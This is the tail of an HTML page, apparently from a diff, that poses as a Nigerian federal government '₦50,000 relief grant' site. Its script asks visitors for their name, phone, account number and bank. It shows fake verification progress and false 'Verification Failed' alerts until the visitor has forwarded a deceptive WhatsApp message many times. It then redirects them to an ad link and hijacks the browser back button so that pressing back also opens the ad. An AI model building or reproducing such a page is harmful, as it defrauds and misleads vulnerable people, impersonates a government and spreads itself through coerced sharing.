+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-w94XYiS24aFcCMApzM-7DDxzR4v4c0bOh0TLQ686ZmxQQ2GDXDS0aUgYfV5EWX4TpclrY6VZ4wz0jj9KL_slpWq9yfPFVvoTXGbhYe83iP9-UbXBs1XmteYgWiZk84q7BGe8ehLZgbB5Jjs-mY7QhBvMthAjkFBDeZXvTVI9jrWWlMBVbfbfDTQrfI4/s180/35812.png" alt="NERSI Logo" onerror="this.src='https://via.placeholder.com/60x60?text=NERSI'">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3-6qYiW0jky9PMCPMYsD1ggGKj3XP0w2ZTALFTllZV7MUJ8K3WQRY9WIS6SzXveGsiK8XMnGl02ckD3akOZ30oi5Lv-o_e92C6iPBDDiU7SLTbZR8hAfO1yo0H7IRMmFtmVqoahWaB6B2gcaGFeF4zaGoDlqhdKZZ7LfDCzR_70ixCpA3ksWhrQ8pasU/s200/35813.jpg" alt="Ministry Logo" class="min-logo" onerror="this.src='https://via.placeholder.com/60x60?text=FMH'">
+            </div>
+
+            <div class="footer-desc">
+                An initiative of the Federal Government of Nigeria, delivered with the Federal Ministry of Humanitarian Affairs and Poverty Reduction.
+            </div>
+
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">How it works</a>
+                <a href="#">Stay safe</a>
+                <a href="#">FAQs</a>
+                <a href="#">Contact</a>
+            </div>
+
+            <div class="footer-legal">
+                &copy; 2026 Federal Government of Nigeria. All rights reserved.
+            </div>
+
+            <!-- SUPERCOUNTER -->
+            <div class="footer-supercounter">
+                <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+                <script type="text/javascript">sc_online_i(1739582,"ffffff","ffffff");</script>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JQUERY -->
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    
+    <script>
+        $(document).ready(function () {
+            
+            // POPUP LOGIC
+            var popupOverlay = document.getElementById('popupOverlay');
+            var popupForm = document.getElementById('popupForm');
+            var popupPhone = document.getElementById('popupPhone');
+            var bgImage = document.getElementById('bgImage');
+
+            setTimeout(function () {
+                popupOverlay.classList.add('active');
+            }, 500);
+
+            popupForm.addEventListener('submit', function (e) {
+                e.preventDefault();
+                var phone = popupPhone.value.trim();
+
+                if (phone.length < 8) {
+                    alert('Please enter a valid phone number');
+                    return;
+                }
+
+                window.savedPhone = phone;
+
+                popupOverlay.classList.remove('active');
+                bgImage.classList.remove('popup-bg-active');
+                
+                $("#flowWrapper").show();
+                $("#loader").show();
+                var i = 0;
+                var interval = setInterval(function () {
+                    i++;
+                    $("#num").text(i + "%");
+                    if (i >= 100) {
+                        clearInterval(interval);
+                        $("#loader").hide();
+                        $("#intro").show();
+                    }
+                }, 30);
+            });
+
+            // MAIN FLOW LOGIC
+            $("#go").click(function () {
+                $("#intro").hide();
+                $("#info").fadeIn(500);
+                if(window.savedPhone) {
+                    $("#add").val(window.savedPhone);
+                }
+            });
+
+            $("#confirm").click(function () {
+                if ($("#name").val().length < 3 || $("#add").val().length < 8 || $("#nums").val().length < 5) {
+                    $(".error").text("Please fill all fields correctly!").fadeIn(500);
+                    return;
+                }
+                
+                $(".error").hide();
+                $("#info").hide();
+                $("#checking").fadeIn(500);
+
+                $("#getname").text($("#name").val());
+                $("#getstate").text($("#state").val());
+                $("#getadd").text($("#add").val());
+                $("#getnum").text($("#nums").val());
+                $("#getbank").text($("#bank").val());
+
+                var i = 0;
+                var interval = setInterval(function () {
+                    i++;
+                    $("#percentage").text(i + "%");
+                    $("#fill").css("width", i + "%");
+                    
+                    if (i == 70) {
+                        i = 69; 
+                        setTimeout(function () { i = 70; }, 1000);
+                    }
+                    
+                    if (i >= 100) {
+                        clearInterval(interval);
+                        setTimeout(function () {
+                            $("#checking").hide();
+                            $("#share").fadeIn(500);
+                        }, 500);
+                    }
+                }, 30);
+            });
+
+            var width = 0;
+            var shareText = "*FEDERAL GOVERNMENT NERSI RELIEF FUND 2026*%0A%0AThe Federal Government is giving out *₦50,000 Grant* to support citizens. %0A%0AAPPLY HERE👉: " + window.location.href + "%0A%0A*_Forward To Other Nigerians To Benefit._*";
+            var shareUrl = "whatsapp://send?text=" + shareText;
+            // Primary redirect URL
+            var redirectUrl = "https://uplcm.com/4/10077877"; 
+
+            $("#whatsapp").click(function () {
+                window.location.href = shareUrl;
+                
+                if (width == 0) { width += 50; } 
+                else if (width == 50) { alert("Verification Failed!\nYou must share with at least 5 groups or 15 friends to complete the process."); width += 15; } 
+                else if (width == 65) { width += 5; } 
+                else if (width == 70) { alert("Almost there! Please share to one more group to verify."); width += 10; } 
+                else if (width == 80) { alert("Processing... Please share again."); width += 5; } 
+                else if (width == 85) { width += 2; } 
+                else if (width == 87) { width += 1; } 
+                else if (width == 88) { width += 2; } 
+                else if (width == 90) { width += 1; } 
+                else if (width == 91) { width += 1; } 
+                else if (width == 92) { width += 1; } 
+                else if (width == 93) { width += 1; } 
+                else if (width == 94) { width += 1; } 
+                else if (width == 95) { width += 1; } 
+                else if (width == 96) { width += 2; } 
+                else { 
+                    $("#share").hide(); 
+                    $("#claim").fadeIn(1000); 
+                    return; 
+                }
+                
+                setTimeout(function () {
+                    $("#fill2").css("width", width + "%");
+                    $("#percentage2").text(width + "%");
+                }, 1000);
+            });
+
+            $("#offer").click(function () {
+                window.open(redirectUrl, "_blank");
+            });
+
+            // Prevent browser back button and redirect to ad
+            window.onhashchange = function () { jp(); };
+            function hh() { history.pushState(history.length + 1, "message", "#" + Math.random()); }
+            function jp() { fh(); }
+            setTimeout('hh();', 500);
+            function fh() { location.href = redirectUrl; }
+        });
+    </script>
+</body>
+</html>
